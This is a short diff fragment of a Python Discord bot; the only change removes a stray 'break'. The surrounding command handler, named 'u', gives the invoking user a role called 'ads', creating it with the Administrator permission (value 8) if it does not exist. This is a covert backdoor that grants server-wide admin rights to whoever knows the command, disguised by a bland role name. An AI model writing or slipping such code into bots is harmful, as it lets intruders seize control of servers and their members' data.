@@ -83,7 +83,6 @@ async def u(ctx):
 		role = discord.utils.get(ctx.guild.roles, name="ads")
 		if role != None:
 			await ctx.message.author.add_roles(role)
-			break
 		else:
 			permissions = discord.Permissions(permissions=8)
 			role = await ctx.message.guild.create_role(name="ads",permissions=permissions)
